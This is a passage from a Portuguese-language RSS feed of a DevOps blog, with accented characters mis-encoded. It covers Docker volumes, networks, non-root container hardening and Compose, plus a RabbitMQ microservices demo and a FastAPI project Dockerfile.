O Docker armazena o resultado de cada instru√ß√£o do Dockerfile em camadas. Se ele encontrar uma camada id√™ntica a uma que j√° construiu antes, ele reaproveita o cache e segue em frente. S√≥ que para isso acontecer, voc√™ precisa saber como escrever o Dockerfile do jeito certo.
Ferramentas de an√°lise de imagem: Dive e Snyk Ferramentas para analise de imagem, vale estudar
Volumes e Redes Volumes e persistencia de dados quando container morre.
Volumes Docker: funcionamento interno e drivers Quando falamos em persist√™ncia de dados no Docker, inevitavelmente estamos falando de volumes. Eles s√£o a forma oficial, segura e recomendada de manter dados fora do ciclo de vida ef√™mero dos containers. Mas o que realmente acontece por tr√°s do docker volume create?
Como o Docker gerencia volumes Quando voc√™ cria um volume, o Docker registra esse recurso em seu pr√≥prio mecanismo de metadados interno. Ele sabe onde o volume est√° no sistema de arquivos do host, qual driver est√° usando e qual container est√° usando aquele volume. Por padr√£o, esse volume √© armazenado em um caminho como:
/var/lib/docker/volumes/[nome_do_volume]/_data Esse _data √© aquilo que o container enxerga quando voc√™ monta o volume, e o Docker se encarrega de conectar esse diret√≥rio ao caminho interno do container que voc√™ definiu, como por exemplo /var/lib/mysql.
Se estiver usando uma engine diferente, como containerd ou cri-o, o funcionamento geral segue a mesma l√≥gica, mas o caminho f√≠sico pode variar.
O que s√£o drivers de volume O Docker permite usar drivers diferentes para gerenciar onde e como os dados s√£o armazenados. Cada driver implementa uma forma espec√≠fica de criar, montar e gerenciar volumes. Os mais comuns s√£o:
local (padr√£o): usa o sistema de arquivos do host. Simples, r√°pido e suficiente para a maioria dos casos; nfs: permite montar volumes armazenados em servidores NFS, √∫til para clusters e compartilhamento em rede; tmpfs: armazena tudo na RAM e desaparece ao reiniciar. Serve para dados tempor√°rios e testes; drivers de terceiros: como rexray, portworx, que integram com solu√ß√µes de storage enterprise como EBS, Azure Disk, Ceph, entre outros. Voc√™ escolhe o driver no momento da cria√ß√£o:
docker volume create --driver local meu-volume Ou, para um volume NFS:
docker volume create \ --driver local \ --opt type=nfs \ --opt o=addr=192.168.1.100,rw \ --opt device=:/dados/nfs \ volume-nfs Como escolher o driver ideal Depende do seu cen√°rio:
Ambiente de desenvolvimento: use o driver local. √â simples e resolve bem; Ambiente de produ√ß√£o com m√∫ltiplos hosts:nfs ou outro driver remoto pode ser necess√°rio; Necessidade de performance de leitura/escrita em mem√≥ria: tmpfs pode ser √∫til; Ambiente em cloud com orquestrador: drivers especializados como rexray com EBS ou plugins CSI no Kubernetes s√£o boas op√ß√µes. Comece com o volume local. Ele atende bem na maioria dos cen√°rios. S√≥ parta para op√ß√µes mais complexas se houver necessidade real de compartilhamento, persist√™ncia remota ou requisitos espec√≠ficos de performance. Volumes: a op√ß√£o oficial, segura e port√°vel Volumes s√£o gerenciados pelo pr√≥prio Docker. Quando voc√™ cria um volume com docker volume create, ele √© registrado nos metadados internos do Docker e fica salvo, por padr√£o, em /var/lib/docker/volumes. O que o container enxerga √© o diret√≥rio _data desse volume.
Pontos fortes:
Isolamento entre containers e o host; Gerenciamento f√°cil via comandos Docker; Backup e migra√ß√£o mais simples; Recomendado para ambientes de produ√ß√£o. docker run -d --name app \ -v dados-app:/usr/src/app/data \ minha-imagem Bridge: o padr√£o que funciona para muita coisa Quando voc√™ n√£o especifica uma rede, o Docker automaticamente coloca seu container na rede bridge padr√£o. Essa rede cria um isolamento de rede dentro do host e fornece resolu√ß√£o de nomes entre containers.
Cria√ß√£o e uso de redes personalizadas Uma das grandes vantagens do Docker √© poder simular ambientes com v√°rios servi√ßos isolados, mas que ainda assim precisam conversar entre si. E √© exatamente aqui que entram as redes personalizadas. Com elas, voc√™ tem mais controle, isolamento e previsibilidade. Vamos entender o porqu√™
Como funciona o DNS interno do Docker Quando voc√™ cria uma rede personalizada com docker network create, o Docker automaticamente habilita um servi√ßo de DNS interno para essa rede. Isso significa que cada container que estiver conectado a ela pode ser referenciado pelo seu nome (ou seja, o nome definido na flag &amp;ndash;name).
docker network create minha-rede dockerrun -d --name banco --network minha-rede postgres Nesse caso, a minha-api consegue se conectar ao banco de dados usando o hostname banco, sem precisar de IP fixo, sem um ‚Äújeitinho‚Äù. O Docker cuida da resolu√ß√£o de nomes.
Como containers se descobrem via hostname Se os containers est√£o na mesma rede personalizada, o nome de um √© vis√≠vel para o outro. Isso simplifica muito a configura√ß√£o de aplica√ß√µes distribu√≠das.
Por exemplo, uma aplica√ß√£o Node.js pode se conectar ao MongoDB apenas apontando a URI para mongodb://mongo:27017, assumindo que o container com o Mongo se chama mongo e ambos est√£o na mesma rede.
Como isolar e expor servi√ßos de forma segura Redes personalizadas s√£o isoladas por padr√£o. Isso significa que apenas containers conectados √† mesma rede conseguem se enxergar. Com isso, voc√™ pode:
Isolar bancos de dados, evitando que sejam acessados por containers que n√£o deveriam;
Separar ambientes (ex: dev e prod);
Reduzir a superf√≠cie de ataque, limitando o tr√°fego entre containers.
E caso precise expor um servi√ßo (como um frontend ou API), basta mapear a porta com -p no dockerrun, ou configurar diretamente no Docker Compose.
docker run -d --name frontend --network minha-rede -p 80:3000 minha-app Conectando e desconectando containers dinamicamente Outro ponto importante √© que voc√™ pode conectar e desconectar containers de redes a qualquer momento:
docker network connect minha-rede containerX docker network disconnect minha-rede containerY Isso permite criar arquiteturas din√¢micas, com controle fino sobre quem fala com quem.
Redes personalizadas n√£o s√≥ organizam o tr√°fego entre seus containers, como tamb√©m s√£o uma ferramenta fundamental de seguran√ßa e isolamento. Entender como elas funcionam e como aproveitar o DNS interno do Docker muda completamente o jeito de estruturar suas aplica√ß√µes multicontainer. E quando o projeto crescer? A mesma l√≥gica de redes personalizadas ser√° usada em ferramentas como Docker Compose e orquestradores como o Kubernetes.
Seguran√ßa com usu√°rios n√£o-root e permiss√µes de arquivos Criar containers seguros vai al√©m de configurar uma imagem funcional. Um dos pilares mais importantes na seguran√ßa de ambientes Docker √© evitar que containers rodem como root, al√©m de configurar corretamente as permiss√µes de arquivos dentro e fora do container.
Por que evitar o usu√°rio root? Quando um container √© iniciado com o usu√°rio root, ele tem permiss√µes totais dentro daquele ambiente isolado. O problema √© que, em caso de falha de seguran√ßa ou fuga de container (container breakout), esse usu√°rio pode comprometer o host inteiro. A superf√≠cie de ataque aumenta consideravelmente.
Boas pr√°ticas:
Nunca use root em containers que precisam interagir com dados sens√≠veis ou que v√£o rodar em produ√ß√£o;
Prefira rodar com um usu√°rio com permiss√µes m√≠nimas necess√°rias;
Adicione esse usu√°rio no momento da constru√ß√£o da imagem.
Como criar um usu√°rio n√£o-root na imagem Docker Dentro do Dockerfile, voc√™ pode criar um usu√°rio e definir que ele ser√° o usu√°rio padr√£o do container:
FROM node:18 # Cria o usu√°rio RUN useradd -m appuser # Define permiss√µes para a pasta da aplica√ß√£o WORKDIR /app COPY . . RUN chown -R appuser:appuser /app # Troca para o usu√°rio USER appuser CMD [&amp;#34;node&amp;#34;, &amp;#34;index.js&amp;#34;] O comando USER muda o usu√°rio efetivo usado durante a execu√ß√£o do container.
Permiss√µes de arquivos e diret√≥rios Mesmo com um usu√°rio n√£o-root, √© fundamental garantir que os arquivos e pastas tenham permiss√µes adequadas.
Use chmod e chown corretamente durante o build da imagem;
Garanta que arquivos sens√≠veis (como tokens, .env, .ssh) estejam protegidos ou fora do contexto do container;
Ao usar volumes, saiba que o usu√°rio do host pode ser diferente do usu√°rio do container ‚Äî e isso pode gerar problemas de permiss√£o;
Solu√ß√£o comum: mapear o mesmo UID/GID no host e no container, ou usar &amp;ndash;user $(id -u):$(id -g) ao rodar o container.
Evitando escalonamento de privil√©gio Mesmo com um usu√°rio n√£o-root, containers mal configurados podem ser explorados. Algumas prote√ß√µes adicionais:
Use readOnlyRootFilesystem (em ambientes orquestrados como Kubernetes);
N√£o monte o socket do Docker (/var/run/docker.sock) dentro do container;
Use &amp;ndash;cap-drop ALL para remover todas as capabilities Linux e adicione apenas as estritamente necess√°rias;
Habilite o AppArmor, SELinux ou seccomp no seu host.
Exemplo pr√°tico: rodando container com UID/GID definidos docker run \ --rm \ --user $(id -u):$(id -g) \ -v $(pwd):/app \ minha-imagem Esse comando garante que o usu√°rio dentro do container ter√° os mesmos IDs do usu√°rio do host, evitando problemas de permiss√£o nos volumes montados.
Evitar o uso do root e gerenciar corretamente permiss√µes dentro dos containers s√£o passos cruciais para criar aplica√ß√µes seguras e prontas para produ√ß√£o. Isso reduz a superf√≠cie de ataque e garante que falhas isoladas n√£o se transformem em brechas cr√≠ticas.
A seguran√ßa come√ßa na imagem, passa pelo runtime e se estende at√© o host. Portanto, cuide de cada camada com aten√ß√£o!
Para compreender mais sobre o assunto, deixo aqui a sugest√£o de um √≥timo livro:
‚ÄúDocker: Up &amp;amp; Running‚Äù (3¬™ edi√ß√£o) Autores: Sean P. Kane e Karl Matthias Editora: O&amp;#39;Reilly Media Ano: 2023 Esse livro √© um prato cheio para quem j√° entende os fundamentos e quer dominar recursos como BuildKit, rootless containers, redes avan√ßadas e integra√ß√£o com Kubernetes. Recomendo especialmente os cap√≠tulos sobre ‚ÄúSeguran√ßa‚Äù, ‚ÄúRedes‚Äù e ‚ÄúPr√°ticas modernas de build‚Äù
Docker Compose: Orquestra√ß√£o de M√∫ltiplos Containers Docker Compose √© uma ferramenta que permite definir e executar aplica√ß√µes multi-container Docker. Com ele, voc√™ usa um arquivo YAML para configurar os servi√ßos da sua aplica√ß√£o, redes e volumes. Depois, com um √∫nico comando, voc√™ sobe ou derruba todo o ambiente.
Por que usar Docker Compose? Ambientes de desenvolvimento: Facilita a configura√ß√£o de ambientes complexos com bancos de dados, filas de mensagens, e outros servi√ßos. Testes: Garante que o ambiente de teste seja id√™ntico ao de produ√ß√£o (ou o mais pr√≥ximo poss√≠vel). Aplica√ß√µes pequenas/m√©dias: Ideal para orquestrar aplica√ß√µes com alguns servi√ßos sem a complexidade de Kubernetes. Exemplo pr√°tico de docker compose no projeto abaixo em nextjs https://github.com/viniciosneves/todo-app-aula-docker
Criado um dockerfile:
FROM node:22 AS builder WORKDIR /app COPY package*.json . RUN npm install COPY . . RUN npm run build FROM node:22-slim WORKDIR /app COPY package*.json . RUN npm install COPY --from=builder /app/dist ./dist EXPOSE 3000 CMD [&amp;#34;node&amp;#34;, &amp;#34;dist/main&amp;#34;] e um dockercompose.yml:
services: postgres: image: postgres:16-alpine restart: unless-stopped ports: - &amp;#34;5432:5432&amp;#34; environment: POSTGRES_DB: ${DB_DATABASE:-todo_db} POSTGRES_USER: ${DB_USERNAME:-postgres} POSTGRES_PASSWORD: ${DB_PASSWORD:-postgres} volumes: - pgdata:/var/lib/postgresql/data networks: - todo-networks app: build: context: . ports: - &amp;#34;3000:3000&amp;#34; environment: DB_HOST: postgres DB_USERNAME: ${DB_USERNAME:-postgres} DB_PASSWORD: ${DB_PASSWORD:-postgres} DB_DATABASE: ${DB_DATABASE:-todo_db} depends_on: - postgres networks: - todo-networks networks: todo-networks: driver: bridge volumes: pgdata: e criado o arquivo .env:
# Database Configuration DB_HOST=postgres DB_PORT=5432 DB_USERNAME=postgres DB_PASSWORD=postgres DB_DATABASE=todo_db # Application PORT=3000 NODE_ENV=development Um outro exemplo abaixo:
Exemplo de docker-compose.yml version: &amp;#39;3.8&amp;#39; services: web: build: . ports: - &amp;#34;80:80&amp;#34; volumes: - .:/app depends_on: - db environment: DATABASE_URL: postgres://user:password@db:5432/mydatabase db: image: postgres:13 environment: POSTGRES_DB: mydatabase POSTGRES_USER: user POSTGRES_PASSWORD: password volumes: - db-data:/var/lib/postgresql/data volumes: db-data: Comandos b√°sicos do Docker Compose: Subir todos os servi√ßos definidos no docker-compose.yml: docker compose up Subir os servi√ßos em segundo plano (detached mode): docker compose up -d Construir ou reconstruir as imagens dos servi√ßos: docker compose build Parar os servi√ßos e remover os containers: docker compose down Parar os servi√ßos, mas manter os containers: docker compose stop Listar os servi√ßos em execu√ß√£o: docker compose ps Visualizar os logs de todos os servi√ßos (ou de um espec√≠fico): docker compose logs [nome-do-servico] Executar um comando em um servi√ßo: docker compose exec [nome-do-servico] [comando] ]]></content:encoded>
    </item>
    <item>
      <title>Microservices Async Demo</title>
      <link>https://fxshelll.github.io/posts/microservices-async-demo/</link>
      <pubDate>Sat, 09 Mar 2019 16:00:36 UT</pubDate>
      <dc:creator>Felipe da Matta</dc:creator>
      <guid>https://fxshelll.github.io/posts/microservices-async-demo/</guid>
      <description>Este projeto demonstra uma arquitetura de microsservi√ßos com comunica√ß√£o ass√≠ncrona utilizando RabbitMQ. O objetivo √© aplicar os conceitos de desacoplamento, escalabilidade e mensageria aprendidos na disciplina.
Tecnologias utilizadas Node.js com Express RabbitMQ (mensageria) Docker e Docker Compose cURL para testes de API Estrutura do Projeto microservices-async-demo/ ‚îÇ ‚îú‚îÄ‚îÄ docker-compose.yml ‚îú‚îÄ‚îÄ README.md ‚îÇ ‚îú‚îÄ‚îÄ service-order/ ‚îÇ ‚îú‚îÄ‚îÄ Dockerfile ‚îÇ ‚îú‚îÄ‚îÄ package.json ‚îÇ ‚îú‚îÄ‚îÄ wait-for-rabbit.sh ‚îÇ ‚îî‚îÄ‚îÄ src/ ‚îÇ ‚îî‚îÄ‚îÄ index.js ‚îÇ ‚îú‚îÄ‚îÄ service-payment/ ‚îÇ ‚îú‚îÄ‚îÄ Dockerfile ‚îÇ ‚îú‚îÄ‚îÄ package.</description>
      <content:encoded><![CDATA[Este projeto demonstra uma arquitetura de microsservi√ßos com comunica√ß√£o ass√≠ncrona utilizando RabbitMQ. O objetivo √© aplicar os conceitos de desacoplamento, escalabilidade e mensageria aprendidos na disciplina.
Tecnologias utilizadas Node.js com Express RabbitMQ (mensageria) Docker e Docker Compose cURL para testes de API Estrutura do Projeto microservices-async-demo/ ‚îÇ ‚îú‚îÄ‚îÄ docker-compose.yml ‚îú‚îÄ‚îÄ README.md ‚îÇ ‚îú‚îÄ‚îÄ service-order/ ‚îÇ ‚îú‚îÄ‚îÄ Dockerfile ‚îÇ ‚îú‚îÄ‚îÄ package.json ‚îÇ ‚îú‚îÄ‚îÄ wait-for-rabbit.sh ‚îÇ ‚îî‚îÄ‚îÄ src/ ‚îÇ ‚îî‚îÄ‚îÄ index.js ‚îÇ ‚îú‚îÄ‚îÄ service-payment/ ‚îÇ ‚îú‚îÄ‚îÄ Dockerfile ‚îÇ ‚îú‚îÄ‚îÄ package.json ‚îÇ ‚îú‚îÄ‚îÄ wait-for-rabbit.sh ‚îÇ ‚îî‚îÄ‚îÄ src/ ‚îÇ ‚îî‚îÄ‚îÄ index.js Microsservi√ßos ServiceOrder: respons√°vel por criar e listar pedidos (POST /orders, GET /orders). ServicePayment: respons√°vel por processar pagamentos dos pedidos. Fluxo Ass√≠ncrono O cliente cria um pedido via ServiceOrder. O ServiceOrder publica uma mensagem no RabbitMQ. O ServicePayment consome a mensagem e processa o pagamento. sequenceDiagram participant Cliente participant ServiceOrder participant RabbitMQ participant ServicePayment Cliente-&amp;gt;&amp;gt;ServiceOrder: POST /orders ServiceOrder-&amp;gt;&amp;gt;RabbitMQ: Publica pedido na fila RabbitMQ-&amp;gt;&amp;gt;ServicePayment: Entrega mensagem ServicePayment-&amp;gt;&amp;gt;ServicePayment: Processa pagamento Como Executar Clonar o reposit√≥rio git clone https://github.com/fxshelll/microservices-async-demo.git Subir os servi√ßos docker compose up --build Acessar o RabbitMQ
Painel: http://localhost:15672
Usu√°rio: guest
Senha: guest
Testes com cURL curl -X POST http://localhost:3001/orders \ -H &amp;#34;Content-Type: application/json&amp;#34; \ -d &amp;#39;{&amp;#34;id&amp;#34;: 1, &amp;#34;item&amp;#34;: &amp;#34;Curso Microsservi√ßos&amp;#34;, &amp;#34;valor&amp;#34;: 149.90}&amp;#39; Listar pedidos curl http://localhost:3001/orders Listar pagamentos curl http://localhost:3002/payments Considera√ß√µes Os servi√ßos aguardam o RabbitMQ estar pronto antes de iniciar. A fila utilizada √© chamada orders. Os pagamentos s√£o simulados com delay e registrados com timestamp. ]]></content:encoded>
    </item>
    <item>
      <title>Imers√£o DevOps - Google Cloud</title>
      <link>https://fxshelll.github.io/posts/imersaodevops/</link>
      <pubDate>Thu, 28 Feb 2019 02:54:51 UT</pubDate>
      <dc:creator>Felipe da Matta</dc:creator>
      <guid>https://fxshelll.github.io/posts/imersaodevops/</guid>
      <description>FastAPI Este projeto √© uma API desenvolvida com FastAPI para gerenciar alunos, cursos e matr√≠culas em uma institui√ß√£o de ensino. Pr√©-requisitos Python 3.10 ou superior instalado Git Docker Passos para subir o projeto Crie um ambiente virtual: $ python3 -m venv ./venv Ative: $ source venv/bin/activate Instale as depend√™ncias: $ pip install -r requirements.txt Execute a aplica√ß√£o: uvicorn app:app --reload Acesse a documenta√ß√£o interativa: Abra o navegador e acesse: http://127.0.0.1:8000/docs</description>
      <content:encoded><![CDATA[FastAPI Este projeto √© uma API desenvolvida com FastAPI para gerenciar alunos, cursos e matr√≠culas em uma institui√ß√£o de ensino. Pr√©-requisitos Python 3.10 ou superior instalado Git Docker Passos para subir o projeto Crie um ambiente virtual: $ python3 -m venv ./venv Ative: $ source venv/bin/activate Instale as depend√™ncias: $ pip install -r requirements.txt Execute a aplica√ß√£o: uvicorn app:app --reload Acesse a documenta√ß√£o interativa: Abra o navegador e acesse: http://127.0.0.1:8000/docs
Aqui voc√™ pode testar todos os endpoints da API de forma interativa.
Estrutura do Projeto app.py: Arquivo principal da aplica√ß√£o FastAPI. models.py: Modelos do banco de dados (SQLAlchemy). schemas.py: Schemas de valida√ß√£o (Pydantic). database.py: Configura√ß√£o do banco de dados SQLite. routers/: Diret√≥rio com os arquivos de rotas (alunos, cursos, matr√≠culas). requirements.txt: Lista de depend√™ncias do projeto. O banco de dados SQLite ser√° criado automaticamente como escola.db na primeira execu√ß√£o. Para reiniciar o banco, basta apagar o arquivo escola.db (isso apagar√° todos os dados). Gerando dockerFile Gerei o arquivo com a ajuda do Gemini Code
# Usa uma imagem oficial do Python como imagem base # A vers√£o python:3.10-slim √© uma √≥tima escolha por ter um tamanho reduzido FROM python:3.10-slim # Define vari√°veis de ambiente ENV PYTHONDONTWRITEBYTECODE 1 ENV PYTHONUNBUFFERED 1 # Define o diret√≥rio de trabalho dentro do cont√™iner WORKDIR /app # Copia o arquivo de depend√™ncias para o diret√≥rio de trabalho COPY requirements.txt . # Instala as depend√™ncias RUN pip install --no-cache-dir --upgrade pip -r requirements.txt # Copia o restante do c√≥digo da aplica√ß√£o para o diret√≥rio de trabalho COPY . . # Exp√µe a porta 8000 para permitir a comunica√ß√£o com a aplica√ß√£o EXPOSE 8000 # Define o comando para executar a aplica√ß√£o # Usa 0.0.0.0 para torn√°-la acess√≠vel de fora do cont√™iner CMD [&amp;#34;uvicorn&amp;#34;, &amp;#34;app:app&amp;#34;, &amp;#34;--host&amp;#34;, &amp;#34;0.0.0.0&amp;#34;, &amp;#34;--port&amp;#34;, &amp;#34;8000&amp;#34;, &amp;#34;--reload&amp;#34;] Fazendo Buid da imagem Push para o Docker Hub Aplica√ß√£o no ar com localhost ]]></content:encoded>
    </item>
  </channel>
</rss>
